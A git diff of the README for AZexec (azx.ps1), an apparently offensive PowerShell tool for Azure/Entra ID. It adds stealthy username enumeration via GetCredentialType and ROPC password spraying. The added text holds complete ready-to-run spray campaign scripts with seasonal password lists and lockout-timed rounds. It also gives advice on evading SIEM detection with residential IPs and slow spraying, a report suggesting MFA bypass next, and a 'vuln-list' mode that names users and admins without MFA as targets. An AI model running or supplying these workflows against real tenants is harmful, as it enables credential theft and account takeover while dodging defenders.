@@ -10,6 +10,14 @@
 
 ---
 
+> **⚡ PASSWORD SPRAY ATTACKS**: AZexec provides a complete password spray workflow using Microsoft's own APIs:
+> 1. **Phase 1** - `users` command: Stealthy username enumeration via GetCredentialType API (no auth logs!)
+> 2. **Phase 2** - `guest` command: ROPC-based credential testing with MFA detection
+> 
+> This two-phase approach is more effective and safer than traditional spraying - only validated usernames are tested, reducing account lockout risk. [See complete workflow →](#password-spray-attack-examples-getcredentialtype--ropc)
+
+---
+
 ## 🔄 NetExec to AZexec Command Mapping
 
 For penetration testers familiar with NetExec (formerly CrackMapExec), here's how the commands translate to Azure:
@@ -18,10 +26,12 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 |---------------------|-------------------|----------------|-------------|
 | `nxc smb --enum` | `.\azx.ps1 tenant -Domain example.com` | ❌ None | Enumerate tenant configuration and endpoints |
 | `nxc smb --users` | `.\azx.ps1 users -Domain example.com -CommonUsernames` | ❌ None | Enumerate valid usernames |
+| `nxc smb --rid-brute` | `.\azx.ps1 user-profiles` | ✅ Required | Enumerate user profiles with details |
 | `nxc smb -u 'a' -p ''` | `.\azx.ps1 guest -Domain example.com -Username user -Password ''` | ❌ None | **Test guest/null login** |
 | `nxc smb --groups` | `.\azx.ps1 groups` | ✅ Required | Enumerate groups |
 | `nxc smb --pass-pol` | `.\azx.ps1 pass-pol` | ✅ Required | Display password policies |
 | `nxc smb 10.10.10.161` | `.\azx.ps1 hosts` | ✅ Required | Enumerate devices (hosts) |
+| `nxc smb --gen-relay-list` | `.\azx.ps1 vuln-list` | ⚡ Hybrid | **Enumerate vulnerable targets** (relay equivalent) |
 | `nxc smb --shares` | *(N/A for Azure)* | - | Azure doesn't have SMB shares |
 
 **Key Difference**: NetExec tests null sessions with `nxc smb -u '' -p ''`. AZexec now has a direct equivalent: `.\azx.ps1 guest -Domain target.com -Username user -Password ''` which tests empty/null password authentication. For post-auth enumeration, use **guest user credentials** which provides similar low-privileged access for reconnaissance. See the [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session) section for details.
@@ -34,6 +44,22 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
   - Detect implicit flow configurations and security risks
   - Access federation metadata for federated tenants
 - **Username Enumeration**: Validate username existence without authentication using GetCredentialType API (mimics `nxc smb --users`)
+  - Stealthy username validation (doesn't trigger auth logs)
+  - No authentication required - perfect for external reconnaissance
+  - Built-in common username lists
+  - Export valid usernames for password spray attacks
+- **Password Spray Attacks**: ROPC-based credential testing (mimics `nxc smb -u users.txt -p 'Pass123'`)
+  - Test single password against multiple users
+  - Support for username:password file format
+  - Automatic lockout detection and account status reporting
+  - MFA detection (valid credentials even if MFA blocks)
+  - **Two-phase attack**: First enumerate with GetCredentialType, then spray with ROPC
+  - Smart delays to avoid account lockouts
+- **User Profile Enumeration**: Enumerate detailed user profiles with authentication (requires User.Read.All)
+  - Display names, job titles, departments, and office locations
+  - User types (Member vs Guest) and account status
+  - Last sign-in activity (if AuditLog.Read.All permission available)
+  - Export to CSV or JSON for offline analysis
 - **Device Enumeration**: Query and display all devices registered in Azure/Entra ID (mimics `nxc smb --hosts`)
 - **Group Enumeration**: Enumerate all Azure AD groups with details (mimics `nxc smb --groups`)
   - Security groups, Microsoft 365 groups, distribution lists
@@ -54,6 +80,16 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
   - Exploit default guest permissions for directory enumeration
   - Modern equivalent of SMB null session attacks
   - Test for misconfigured guest access policies
+- **Vulnerable Target Enumeration**: Enumerate weak authentication configurations (mimics `nxc smb --gen-relay-list`)
+  - Service principals with password-only credentials (like SMB hosts without signing)
+  - Applications with public client flows enabled (ROPC vulnerable)
+  - Tenants with legacy authentication not blocked
+  - Security Defaults and Conditional Access gaps
+  - Stale guest accounts and dangerous OAuth permissions
+  - **Guest permission level check** (null session equivalent vulnerability)
+  - **Users without MFA registered** (credential attack targets)
+  - Guest invite policy configuration
+  - Hybrid approach: unauthenticated checks + authenticated enumeration
 - **Netexec-Style Output**: Familiar output format for penetration testers and security professionals
 - **Advanced Filtering**: Filter devices by OS, trust type, compliance status, and more
 - **Owner Information**: Optional device owner enumeration with additional API calls
@@ -61,6 +97,11 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 - **Colored Output**: Color-coded output for better readability (can be disabled)
 - **Automatic Authentication**: Handles Microsoft Graph API authentication seamlessly (for authenticated commands)
 - **PowerShell 7 Compatible**: Modern PowerShell implementation
+
+## 📚 Additional Documentation
+
+- **[Complete Password Spray Attack Guide](PASSWORD-SPRAY.md)** - Comprehensive documentation for GetCredentialType enumeration + ROPC password spraying
+- **[Notes & Roadmap](notes.md)** - Planned features and implementation status
 
 ## 📋 Requirements
 
@@ -92,10 +133,27 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 ### For Username Enumeration (users command):
 - **No authentication required** - Uses public GetCredentialType API endpoint
 
+### For User Profile Enumeration (user-profiles command):
+- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
+- **Azure/Entra ID Permissions**:
+  - Minimum: `User.Read.All` or `Directory.Read.All` scope
+  - For sign-in activity: `AuditLog.Read.All` scope (optional but recommended)
+  - Guest users may have restricted access depending on tenant settings
+
 ### For Guest Login Enumeration (guest command):
 - **No authentication required** - Uses public ROPC OAuth2 endpoint
 - Tests credentials against Azure/Entra ID authentication endpoints
 - Detects MFA requirements, account lockouts, and password expiration
+
+### For Vulnerable Target Enumeration (vuln-list command):
+- **Hybrid approach**: Performs unauthenticated checks first, then authenticated enumeration
+- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
+- **Azure/Entra ID Permissions** (for authenticated phase):
+  - `Application.Read.All` - Enumerate service principals and apps
+  - `Directory.Read.All` - Enumerate guest users and OAuth grants
+  - `Policy.Read.All` - Check Conditional Access, Security Defaults, and guest permission policy
+  - `AuditLog.Read.All` - Check user MFA registration status
+- **Unauthenticated checks** work without any credentials (tenant config, ROPC status, legacy auth endpoints)
 
 ## 🚀 Installation
 
@@ -126,7 +184,23 @@ $PSVersionTable.PSVersion
 .\azx.ps1 guest -Domain target.com           # Check if tenant accepts guests
 ```
 
-**Scenario 1b: Guest Login Testing (Like nxc smb -u 'a' -p '')**
+**Scenario 1b: Password Spray Attack (Complete Workflow)**
+```powershell
+# Phase 1: Enumerate valid usernames with GetCredentialType API (no auth, no logs)
+.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv
+
+# Phase 2: Extract valid usernames for spraying
+$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
+$validUsers | Out-File -FilePath spray-targets.txt
+
+# Phase 3: Password spray with ROPC authentication
+.\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-results.json
+
+# Review results - look for valid credentials, MFA-enabled accounts, and locked accounts
+Get-Content spray-results.json | ConvertFrom-Json | Select -ExpandProperty AuthResults | Where-Object { $_.Success -eq $true }
+```
+
+**Scenario 1c: Quick Null Password Testing (Like nxc smb -u 'a' -p '')**
 ```powershell
 .\azx.ps1 guest                                                    # Check current tenant (auto-detect)
 .\azx.ps1 guest -Domain target.com -Username user -Password ''     # Test null password
@@ -137,6 +211,7 @@ $PSVersionTable.PSVersion
 ```powershell
 # The "Azure Null Session" - most powerful low-noise technique
 .\azx.ps1 hosts                              # Login with guest credentials
+.\azx.ps1 user-profiles -ExportPath users.csv  # Enumerate user profiles
 .\azx.ps1 groups                             # Enumerate groups
 .\azx.ps1 hosts -ShowOwners -ExportPath enum.json  # Full enumeration
 ```
@@ -146,6 +221,15 @@ $PSVersionTable.PSVersion
 .\azx.ps1 hosts -Scopes "User.Read.All,Device.Read.All,Group.Read.All"
 .\azx.ps1 hosts -Filter noncompliant         # Find weak security posture
 .\azx.ps1 pass-pol                           # Check password policies
+```
+
+**Scenario 4: Vulnerability Assessment (Like nxc smb --gen-relay-list)**
+```powershell
+# The Azure equivalent of finding SMB hosts without signing
+.\azx.ps1 vuln-list                          # Full vuln assessment (domain auto-detected)
+.\azx.ps1 vuln-list -Domain target.com       # Target specific tenant
+.\azx.ps1 vuln-list -ExportPath relay.txt    # Export HIGH risk targets (relay-list style)
+.\azx.ps1 vuln-list -ExportPath full.json    # Export all findings as JSON
 ```
 
 ### Basic Syntax
@@ -160,6 +244,9 @@ $PSVersionTable.PSVersion
 # Username enumeration (no authentication required, auto-detects domain if not specified)
 .\azx.ps1 users [-Domain <DomainName>] [-Username <User>] [-UserFile <Path>] [-CommonUsernames] [-NoColor] [-ExportPath <Path>]
 
+# User profile enumeration (authentication required)
+.\azx.ps1 user-profiles [-NoColor] [-ExportPath <Path>]
+
 # Group enumeration (authentication required)
 .\azx.ps1 groups [-ShowOwners] [-NoColor] [-ExportPath <Path>]
 
@@ -168,13 +255,16 @@ $PSVersionTable.PSVersion
 
 # Guest login enumeration (like nxc smb -u 'a' -p '') - domain auto-detected if not specified
 .\azx.ps1 guest [-Domain <DomainName>] [-Username <User>] [-Password <Password>] [-UserFile <Path>] [-NoColor] [-ExportPath <Path>]
+
+# Vulnerable target enumeration (like nxc smb --gen-relay-list) - domain auto-detected if not specified
+.\azx.ps1 vuln-list [-Domain <DomainName>] [-NoColor] [-ExportPath <Path>]
 ```
 
 ### Parameters
 
 | Parameter | Description | Required | Default |
 |-----------|-------------|----------|---------|
-| `Command` | Operation to perform: `hosts`, `tenant`, `users`, `groups`, `pass-pol`, `guest` | Yes | - |
+| `Command` | Operation to perform: `hosts`, `tenant`, `users`, `user-profiles`, `groups`, `pass-pol`, `guest`, `vuln-list` | Yes | - |
 | `Domain` | Domain name for tenant/user/guest discovery. Auto-detected from UPN, username, or environment if not provided | No | Auto-detect |
 | `Filter` | Filter devices by criteria | No | `all` |
 | `ShowOwners` | Display device/group owners (slower) | No | `False` |
@@ -246,6 +336,42 @@ Check common usernames and export valid ones:
 Check a specific user plus common usernames:
 ```powershell
 .\azx.ps1 users -Domain example.com -Username admin@example.com -CommonUsernames -ExportPath results.json
+```
+
+### User Profile Enumeration Examples
+
+### Example 8a: Basic User Profile Enumeration
+Enumerate all user profiles in the Azure/Entra tenant (authenticated):
+```powershell
+.\azx.ps1 user-profiles
+```
+
+### Example 8b: User Profile Enumeration with CSV Export
+Enumerate all user profiles and export to CSV:
+```powershell
+.\azx.ps1 user-profiles -ExportPath users.csv
+```
+
+### Example 8c: User Profile Enumeration with JSON Export
+Enumerate all user profiles and export to JSON with full details:
+```powershell
+.\azx.ps1 user-profiles -ExportPath users.json
+```
+
+### Example 8d: User Profile Enumeration as Guest User
+Test what user profiles a guest user can enumerate:
+```powershell
+# Connect as guest user first
+.\azx.ps1 user-profiles -ExportPath guest-users.json
+```
+
+### Example 8e: Complete Directory Enumeration
+Enumerate users, groups, devices, and policies:
+```powershell
+.\azx.ps1 user-profiles -ExportPath users.csv
+.\azx.ps1 groups -ExportPath groups.csv
+.\azx.ps1 hosts -ExportPath devices.csv
+.\azx.ps1 pass-pol -ExportPath policy.json
 ```
 
 ### Tenant Discovery Examples
@@ -510,6 +636,291 @@ Test credentials and export results:
 .\azx.ps1 guest -Domain targetcorp.com -UserFile users.txt -Password 'Password123' -ExportPath spray-results.json
 ```
 
+### Password Spray Attack Examples (GetCredentialType + ROPC)
+
+The most effective password spray attacks combine **username enumeration** with **credential testing** in a two-phase approach:
+
+### Example 28n: Complete Password Spray - Common Usernames
+Full workflow using common administrator accounts:
+```powershell
+# Phase 1: Enumerate valid usernames (GetCredentialType - no authentication logs)
+.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
+
+# Phase 2: Extract valid usernames
+$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
+$validUsers | Out-File -FilePath spray-targets.txt
+Write-Host "Found $($validUsers.Count) valid usernames for spraying"
+
+# Phase 3: Password spray with seasonal password
+.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-results.json
+
+# Phase 4: Analyze results
+$results = Get-Content spray-results.json | ConvertFrom-Json
+$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
+$mfaAccounts = $results.AuthResults | Where-Object { $_.MFARequired -eq $true }
+
+Write-Host "`nValid Credentials Found: $($validCreds.Count)"
+Write-Host "Accounts with MFA: $($mfaAccounts.Count)"
+$validCreds | Format-Table Username, MFARequired, HasToken
+```
+
+### Example 28o: Targeted Password Spray - Custom Username List
+Using a custom list of identified users:
+```powershell
+# Assume you've collected usernames from OSINT, LinkedIn, company website, etc.
+# Create a file: executives.txt with usernames (one per line)
+
+# Phase 1: Validate which usernames actually exist
+.\azx.ps1 users -Domain targetcorp.com -UserFile executives.txt -ExportPath validated-execs.csv
+
+# Phase 2: Spray only against valid accounts
+$validExecs = Import-Csv validated-execs.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
+$validExecs | Out-File -FilePath valid-executives.txt
+
+# Phase 3: Test with company-specific password pattern
+.\azx.ps1 guest -Domain targetcorp.com -UserFile valid-executives.txt -Password 'TargetCorp2024!' -ExportPath exec-spray.json
+```
+
+### Example 28p: Multi-Password Spray Campaign
+Testing multiple passwords sequentially (with delays to avoid lockouts):
+```powershell
+# Validate usernames first
+.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
+$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
+$validUsers | Out-File spray-targets.txt
+
+# Password list (seasonal passwords + common patterns)
+$passwords = @(
+    'Summer2024!',
+    'Winter2024!',
+    'Spring2024!',
+    'Fall2024!',
+    'Password123!',
+    'Welcome123!',
+    'TargetCorp2024!'
+)
+
+# Spray each password with 30-minute delay between rounds
+foreach ($password in $passwords) {
+    Write-Host "`n[*] Testing password: $password"
+    .\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password $password -ExportPath "spray-$password.json"
+    
+    # Wait 30 minutes before next password (avoid account lockouts)
+    if ($password -ne $passwords[-1]) {
+        Write-Host "[*] Waiting 30 minutes before next password spray..."
+        Start-Sleep -Seconds 1800  # 30 minutes
+    }
+}
+
+# Consolidate all results
+$allResults = @()
+foreach ($password in $passwords) {
+    $result = Get-Content "spray-$password.json" | ConvertFrom-Json
+    $validCreds = $result.AuthResults | Where-Object { $_.Success -eq $true }
+    $allResults += $validCreds
+}
+
+Write-Host "`n[+] Total valid credentials found: $($allResults.Count)"
+$allResults | Format-Table Username, Password, MFARequired, HasToken
+```
+
+### Example 28q: Smart Password Spray - Avoid Known Lockout Thresholds
+Intelligent spraying that respects common lockout policies:
+```powershell
+# Most organizations lock accounts after 5-10 failed attempts
+# Spray only 1 password per day to stay under threshold
+
+# Day 1: Validate usernames
+.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
+$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
+$validUsers | Out-File spray-targets.txt
+
+# Day 1: Test most common password
+.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-day1.json
+
+# Day 2: Test second most common (24 hours later)
+.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'Winter2024!' -ExportPath spray-day2.json
+
+# Day 3: Test company-specific pattern
+.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'TargetCorp2024!' -ExportPath spray-day3.json
+
+# Analyze results after campaign
+$day1 = Get-Content spray-day1.json | ConvertFrom-Json
+$day2 = Get-Content spray-day2.json | ConvertFrom-Json
+$day3 = Get-Content spray-day3.json | ConvertFrom-Json
+
+$allValidCreds = @()
+$allValidCreds += $day1.AuthResults | Where-Object { $_.Success }
+$allValidCreds += $day2.AuthResults | Where-Object { $_.Success }
+$allValidCreds += $day3.AuthResults | Where-Object { $_.Success }
+
+Write-Host "[+] Campaign complete - Valid credentials: $($allValidCreds.Count)"
+$allValidCreds | Export-Csv campaign-results.csv -NoTypeInformation
+```
+
+### Example 28r: Password Spray with Username:Password Format
+Testing specific username/password combinations:
+```powershell
+# Create a file (creds.txt) with format: username:password
+# admin:Password123
+# alice:Summer2024!
+# bob@targetcorp.com:Welcome2024!
+
+# Test all credentials at once
+.\azx.ps1 guest -Domain targetcorp.com -UserFile creds.txt -ExportPath cred-test-results.json
+
+# Analyze what worked
+$results = Get-Content cred-test-results.json | ConvertFrom-Json
+$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
+$mfaRequired = $validCreds | Where-Object { $_.MFARequired -eq $true }
+$fullAccess = $validCreds | Where-Object { $_.HasToken -eq $true }
+
+Write-Host "`nValid Credentials: $($validCreds.Count)"
+Write-Host "Full Access (no MFA): $($fullAccess.Count)"
+Write-Host "MFA Required: $($mfaRequired.Count)"
+```
+
+### Example 28s: Automated Password Spray Analysis
+Complete workflow with result analysis and reporting:
+```powershell
+# Comprehensive password spray with analysis
+$domain = "targetcorp.com"
+$password = "Summer2024!"
+
+# Step 1: Username enumeration
+Write-Host "[*] Phase 1: Enumerating valid usernames..."
+.\azx.ps1 users -Domain $domain -CommonUsernames -ExportPath users-enum.csv
+
+# Step 2: Extract valid usernames
+$validUsers = Import-Csv users-enum.csv | Where-Object { $_.Exists -eq 'True' }
+Write-Host "[+] Found $($validUsers.Count) valid usernames"
+$validUsers.Username | Out-File spray-targets.txt
+
+# Step 3: Password spray
+Write-Host "[*] Phase 2: Password spraying..."
+.\azx.ps1 guest -Domain $domain -UserFile spray-targets.txt -Password $password -ExportPath spray-results.json
+
+# Step 4: Analyze results
+$results = Get-Content spray-results.json | ConvertFrom-Json
+
+$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
+$invalidCreds = $results.AuthResults | Where-Object { $_.Success -eq $false }
+$mfaRequired = $results.AuthResults | Where-Object { $_.MFARequired -eq $true }
+$lockedAccounts = $results.AuthResults | Where-Object { $_.ErrorCode -eq 'ACCOUNT_LOCKED' }
+
+# Step 5: Generate report
+$report = @"
+
+=================================================
+   PASSWORD SPRAY ATTACK REPORT
+=================================================
+Target Domain:        $domain
+Test Password:        $password
+Date:                 $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+
+RESULTS SUMMARY
+-------------------------------------------------
+Total Usernames Tested:     $($results.AuthResults.Count)
+Valid Credentials Found:    $($validCreds.Count)
+  - Full Access (no MFA):   $($validCreds.Count - $mfaRequired.Count)
+  - MFA Required:           $($mfaRequired.Count)
+Invalid Credentials:        $($invalidCreds.Count)
+Locked Accounts:            $($lockedAccounts.Count)
+
+VALID CREDENTIALS
+-------------------------------------------------
+$($validCreds | ForEach-Object { "  [+] $($_.Username) - MFA: $($_.MFARequired)" } | Out-String)
+
+RECOMMENDATIONS
+-------------------------------------------------
+"@
+
+if ($validCreds.Count -gt 0) {
+    $report += "  [!] CRITICAL: Valid credentials found!`n"
+    $report += "  [*] Next steps:`n"
+    $report += "      1. Test accounts without MFA for full access`n"
+    $report += "      2. Attempt MFA bypass techniques for MFA-protected accounts`n"
+    $report += "      3. Use valid credentials for further enumeration`n"
+}
+
+if ($lockedAccounts.Count -gt 0) {
+    $report += "`n  [!] WARNING: $($lockedAccounts.Count) accounts locked during spray`n"
+    $report += "  [*] Consider longer delays between attempts`n"
+}
+
+$report += "`n=================================================`n"
+
+Write-Host $report
+$report | Out-File "spray-report-$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
+
+Write-Host "`n[+] Report saved to: spray-report-$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
+```
+
+**Why This Two-Phase Approach is Effective:**
+
+1. **Stealth**: GetCredentialType doesn't trigger authentication logs (Phase 1)
+2. **Efficiency**: Only spray against validated usernames (avoid wasted attempts)
+3. **Safety**: Reduces account lockout risk by testing fewer invalid usernames
+4. **Intelligence**: Separate enumeration from credential testing for better OPSEC
+5. **Speed**: Validate 100s of usernames quickly, then spray only valid targets
+
+**Detection Considerations:**
+
+| Activity | Detection Risk | SIEM Alert Likelihood | Mitigation |
+|----------|----------------|----------------------|------------|
+| GetCredentialType enumeration | 🟢 Low | Low - No auth logs generated | Use residential IP, rate-limit requests |
+| ROPC password spray | 🟡 Medium | Medium - Failed auth logs | Slow spray (1 password/day), respect lockout thresholds |
+| Multiple password spray rounds | 🔴 High | High - Pattern detection | Long delays between passwords (24+ hours) |
+| Account lockouts | 🔴 Critical | Critical - Immediate SOC alert | Test minimal passwords, monitor for lockouts |
+
+### Vulnerable Target Enumeration Examples (like nxc smb --gen-relay-list)
+
+### Example 29: Basic Vulnerability Enumeration (Auto-Detect Domain)
+Enumerate vulnerable targets in your current tenant:
+```powershell
+.\azx.ps1 vuln-list
+```
+
+### Example 30: Target Specific Tenant
+Enumerate vulnerabilities for a specific domain:
+```powershell
+.\azx.ps1 vuln-list -Domain targetcorp.com
+```
+
+### Example 31: Export HIGH Risk Targets (Relay-List Style)
+Export only HIGH risk findings in a simple format (like nxc --gen-relay-list):
+```powershell
+.\azx.ps1 vuln-list -ExportPath relay_targets.txt
+```
+
+### Example 32: Export Full Vulnerability Report (JSON)
+Export all findings with full details:
+```powershell
+.\azx.ps1 vuln-list -ExportPath vuln_report.json
+```
+
+### Example 33: Export to CSV for Spreadsheet Analysis
+```powershell
+.\azx.ps1 vuln-list -Domain targetcorp.com -ExportPath findings.csv
+```
+
+**What vuln-list Checks:**
+
+| Check | Phase | Risk | Description |
+|-------|-------|------|-------------|
+| Implicit Flow | Unauth | MEDIUM | OAuth implicit flow enabled (token theft risk) |
+| ROPC Enabled | Unauth | HIGH | Password spray/brute force possible |
+| Legacy Auth Endpoints | Unauth | INFO | Legacy protocols accessible |
+| Password-Only SPs | Auth | HIGH | Service principals without certificate auth |
+| Public Client Apps | Auth | MEDIUM | Applications allowing ROPC/device code |
+| Security Defaults | Auth | MEDIUM | Security Defaults disabled |
+| Legacy Auth Blocking | Auth | HIGH | No CA policy blocking legacy auth |
+| Stale Guest Accounts | Auth | MEDIUM | Guests with no activity 90+ days |
+| Dangerous Permissions | Auth | HIGH | Apps with high-risk API permissions |
+| **Guest Permission Level** | Auth | HIGH/MEDIUM | Guests with excessive permissions (null session equivalent) |
+| **Users Without MFA** | Auth | HIGH | Users without any MFA method registered |
+| Guest Invite Policy | Auth | MEDIUM | Anyone (including guests) can invite external users |
+
 ### Example 28: Real-World Red Team Scenario
 Complete attack chain using guest enumeration:
 ```powershell
@@ -567,6 +978,36 @@ AZR         example.com                         443    admin@example.com        
 - Valid usernames found
 - Invalid usernames
 - List of valid usernames with authentication type
+
+### User Profile Enumeration Output
+
+```
+AZR         a1b2c3d4e5f6    443    John Smith                             [*] (upn:john.smith@example.com) (job:Senior Engineer) (dept:IT) (type:Member) (status:Enabled) (location:Seattle) (lastSignIn:2025-12-10)
+AZR         f6e5d4c3b2a1    443    Jane Doe                               [*] (upn:jane.doe@example.com) (job:Marketing Manager) (dept:Marketing) (type:Member) (status:Enabled) (location:New York) (lastSignIn:2025-12-12)
+AZR         1234567890ab    443    External Vendor                        [*] (upn:vendor@partner.com#EXT#@examp...) (job:N/A) (dept:N/A) (type:Guest) (status:Enabled) (location:N/A) (lastSignIn:2025-11-20)
+AZR         abcdef123456    443    Test Account                           [*] (upn:test@example.com) (job:N/A) (dept:N/A) (type:Member) (status:Disabled) (location:N/A) (lastSignIn:Never/Unknown)
+```
+
+**Color Coding:**
+- **Green**: Active member users (enabled accounts)
+- **Yellow**: Guest users (external/B2B users)
+- **Dark Gray**: Disabled accounts
+
+**User Information Displayed:**
+- **UPN**: User Principal Name (email/login)
+- **Job**: Job title
+- **Dept**: Department
+- **Type**: Member (internal) or Guest (external/B2B)
+- **Status**: Enabled or Disabled
+- **Location**: Office location
+- **LastSignIn**: Last sign-in date (requires AuditLog.Read.All permission)
+
+**Summary Statistics:**
+- Total users found
+- Member users count
+- Guest users count
+- Enabled accounts count
+- Disabled accounts count
 
 ### Tenant Discovery Output
 
@@ -791,6 +1232,145 @@ AZR         targetcorp.com                      443    service@targetcorp.com   
 - MFA detection (valid creds even if MFA blocks)
 - Account lockout detection
 - Password expiration detection
+
+### Vulnerable Target Enumeration Output (mimics `nxc smb --gen-relay-list`)
+
+```
+[*] AZX - Vulnerable Target Enumeration
+[*] Command: Vuln-List (Azure Relay Target Equivalent)
+[*] Similar to: nxc smb 192.168.1.0/24 --gen-relay-list
+
+[*] PHASE 1: Unauthenticated Enumeration
+[*] ========================================
+
+[+] Using auto-detected domain: targetcorp.com
+
+[*] Checking tenant configuration for: targetcorp.com
+    [+] Tenant ID: 12345678-1234-1234-1234-123456789abc
+    [!] IMPLICIT FLOW ENABLED - Token theft risk
+
+[*] Testing guest/external authentication...
+    [!] ROPC ENABLED - Password spray/brute force possible
+
+[*] Checking legacy authentication endpoints...
+    [*] Exchange ActiveSync endpoint accessible
+    [*] Autodiscover endpoint accessible (requires auth)
+
+[*] PHASE 2: Authenticated Enumeration
+[*] ========================================
+
+[+] Using existing Graph connection: user@targetcorp.com
+
+[*] Enumerating Service Principals with password credentials...
+    (Like SMB hosts without signing - weaker authentication)
+    [!] Legacy App Service
+        AppId: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
+    [!] API Integration [EXPIRING SOON]
+        AppId: 11111111-2222-3333-4444-555555555555
+
+    [*] Total password-only service principals: 12
+
+[*] Enumerating applications with public client flows enabled...
+    (Allows ROPC - direct username/password authentication)
+    [!] Mobile App [MEDIUM]
+        AppId: 99999999-8888-7777-6666-555555555555 | Audience: AzureADMultipleOrgs
+    [!] Desktop Client [HIGH]
+        AppId: 00000000-1111-2222-3333-444444444444 | Audience: AzureADMyOrg
+
+    [*] Total public client applications: 5
+
+[*] Checking Security Defaults and Conditional Access...
+    [!] SECURITY DEFAULTS DISABLED
+        Check if Conditional Access provides equivalent protection
+    [!] LEGACY AUTH NOT BLOCKED - MFA bypass possible
+    [*] Found 8 Conditional Access policies
+
+[*] Enumerating guest users...
+    (External users = potential 'null session' equivalent)
+    [*] Total guest users: 47
+    [*] Active guests (90 days): 23
+    [!] Stale guests (no activity 90+ days): 24
+
+[*] Checking for applications with dangerous API permissions...
+    [!] Third-Party Sync App
+        Permissions: Mail.ReadWrite, Mail.Send
+    [!] Backup Solution
+        Permissions: Files.ReadWrite.All, Sites.ReadWrite.All
+
+    [*] Total apps with dangerous permissions: 3
+
+[*] Checking guest user permission level...
+    (Determines what guests can enumerate - the 'null session' equivalent)
+    [!] CRITICAL: Guest access = SAME AS MEMBER USERS
+        Guests can enumerate entire directory (null session equivalent)
+    [!] Guest invites: ANYONE can invite (including guests)
+
+[*] Checking for users without MFA methods registered...
+    (Users vulnerable to credential stuffing/phishing)
+    [!] Users WITHOUT MFA: 23
+        - John Smith
+        - Jane Doe [ADMIN]
+        - Bob Wilson
+        - Alice Johnson
+        - Test Account
+        ... and 18 more
+    [!] CRITICAL: 2 ADMIN(S) without MFA!
+    [*] Total checked: 150 | With MFA: 127 | Without: 23
+
+[*] ========================================
+[*] VULNERABILITY SUMMARY
+[*] ========================================
+
+AZR         targetcorp.com                      443    [*] Vuln-List Results
+
+    [!] HIGH RISK findings:   12
+    [!] MEDIUM RISK findings: 10
+    [*] Total findings:       22
+
+[+] Full results exported to: vuln_report.json
+
+[*] RECOMMENDATIONS:
+    [!] Address HIGH risk findings immediately:
+        - Replace password credentials with certificates for service principals
+        - Block legacy authentication via Conditional Access
+        - Review and minimize dangerous API permissions
+        - Restrict guest user permissions to "Most restricted"
+        - Enforce MFA registration for all users (especially admins!)
+    [*] Review MEDIUM risk findings:
+        - Audit public client applications
+        - Clean up stale guest accounts
+        - Enable Security Defaults or equivalent CA policies
+        - Restrict guest invite permissions
+
+[*] Vuln-list enumeration complete!
+```
+
+**Color Coding:**
+- **Red**: HIGH risk findings (immediate action required)
+- **Yellow**: MEDIUM risk findings (should be reviewed)
+- **Green**: Passed checks or good security posture
+- **Dark Gray**: Informational findings
+
+**Phase 1 (Unauthenticated) Checks:**
+- Tenant configuration (implicit flow, ROPC status)
+- Legacy authentication endpoint accessibility
+- Guest/external authentication acceptance
+
+**Phase 2 (Authenticated) Checks:**
+- Service principals with password-only credentials (no certificate auth)
+- Applications with public client flows (ROPC vulnerable)
+- Security Defaults and Conditional Access gaps
+- Legacy authentication blocking policies
+- Guest user enumeration and stale accounts
+- Dangerous OAuth permission grants
+- **Guest permission level** (null session vulnerability)
+- **Users without MFA registered** (credential attack targets)
+- Guest invite policy configuration
+
+**Export Formats:**
+- `.txt` - Simple relay-list style (HIGH risk only): `Type,Target,Vulnerability`
+- `.json` - Full findings with all metadata
+- `.csv` - Spreadsheet-friendly format
 
 ## 🔍 Interpreting Security Findings
 
@@ -1221,6 +1801,20 @@ Includes: Username, Exists (True/False), IfExistsResult (numeric code), AuthType
 ```
 Structured JSON with all response details including throttle status and full API response data
 
+### User Profile Enumeration Export
+
+#### CSV Export
+```powershell
+.\azx.ps1 user-profiles -ExportPath users.csv
+```
+Includes: UserId, DisplayName, UserPrincipalName, Mail, JobTitle, Department, OfficeLocation, UserType, AccountEnabled, LastSignInDateTime
+
+#### JSON Export (Recommended)
+```powershell
+.\azx.ps1 user-profiles -ExportPath users.json
+```
+Structured JSON with all user profile properties including sign-in activity
+
 ### Tenant Discovery Export
 
 #### JSON Export (Recommended)
@@ -1607,14 +2201,16 @@ This tool is provided for **legitimate security testing, research, and administr
 |-----------|---------|----------------|--------------------|
 | Discover tenant | `.\azx.ps1 tenant -Domain target.com` | ❌ None | `nxc smb --enum` |
